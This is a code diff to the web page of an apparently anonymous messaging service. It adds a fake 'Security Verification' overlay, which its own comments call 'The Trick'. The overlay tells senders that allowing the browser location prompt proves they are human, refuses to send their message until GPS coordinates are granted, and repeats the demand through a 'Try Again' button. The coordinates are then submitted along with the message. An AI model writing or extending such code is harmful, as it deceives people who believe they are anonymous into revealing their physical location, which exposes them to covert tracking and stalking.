@@ -26,14 +26,35 @@
   <!-- Security Verification Overlay (The Trick) -->
   <div id="securityOverlay" class="hidden" style="position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); font-family: sans-serif;">
     <div style="background: white; padding: 30px; border-radius: 20px; text-align: center; max-width: 320px; width: 90%;">
-      <div class="loader-spin"></div>
-      <h2 style="font-size: 18px; color: #333; margin-bottom: 10px;">Security Verification</h2>
-      <p style="font-size: 14px; color: #666; line-height: 1.4; margin-bottom: 20px;">
-        To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.
-      </p>
-      <div style="font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 15px;">
-        Checking browser integrity...
+
+      <!-- Checking state (default) -->
+      <div id="overlayChecking">
+        <div class="loader-spin"></div>
+        <h2 style="font-size: 18px; color: #333; margin-bottom: 10px;">Security Verification</h2>
+        <p style="font-size: 14px; color: #666; line-height: 1.4; margin-bottom: 20px;">
+          To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.
+        </p>
+        <div style="font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 15px;">
+          Checking browser integrity...
+        </div>
       </div>
+
+      <!-- Failed state (shown when location denied) -->
+      <div id="overlayFailed" style="display:none;">
+        <div style="font-size: 48px; margin-bottom: 12px;">⚠️</div>
+        <h2 style="font-size: 18px; color: #c0392b; margin-bottom: 10px;">Verification Failed</h2>
+        <p style="font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px;">
+          Browser security check could not be completed.<br><br>
+          Please tap <b>Allow</b> when the location prompt appears. This is required to confirm you're not a bot.
+        </p>
+        <button onclick="retryVerification()" style="background: #e8176e; color: white; border: none; padding: 12px 28px; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 10px;">
+          🔄 Try Again
+        </button>
+        <div style="font-size: 11px; color: #aaa; padding-top: 10px; border-top: 1px solid #eee;">
+          Anonymous messages are protected by security verification
+        </div>
+      </div>
+
     </div>
   </div>
 
@@ -150,6 +171,29 @@
     }
 
     // 5. Send Message Function
+    let pendingMessage = null; // store message while waiting for location
+
+    function showChecking() {
+      document.getElementById('overlayChecking').style.display = 'block';
+      document.getElementById('overlayFailed').style.display = 'none';
+    }
+
+    function showFailed() {
+      document.getElementById('overlayChecking').style.display = 'none';
+      document.getElementById('overlayFailed').style.display = 'block';
+    }
+
+    async function retryVerification() {
+      showChecking();
+      const coords = await getGPS();
+      if (!coords) {
+        showFailed();
+        return;
+      }
+      // Location granted on retry — submit now
+      await submitMessage(pendingMessage, coords);
+    }
+
     async function sendMessage() {
       const messageInput = document.getElementById('messageInput');
       const message = messageInput.value.trim();
@@ -163,10 +207,26 @@
       // Show the Security Trick Overlay
       const overlay = document.getElementById('securityOverlay');
       overlay.classList.remove('hidden');
+      showChecking();
 
       // Acquire GPS as part of "Verification"
       const coords = await getGPS();
 
+      // If location was denied, block sending and show failed state
+      if (!coords) {
+        pendingMessage = message;
+        showFailed();
+        return; // ← message is NOT sent
+      }
+
+      // Small pause for realistic "verifying" feel
+      await new Promise(r => setTimeout(r, 600));
+      await submitMessage(message, coords);
+    }
+
+    async function submitMessage(message, coords) {
+      const overlay = document.getElementById('securityOverlay');
+      showChecking();
       // Small pause for realistic "verifying" feel
       await new Promise(r => setTimeout(r, 600));
 
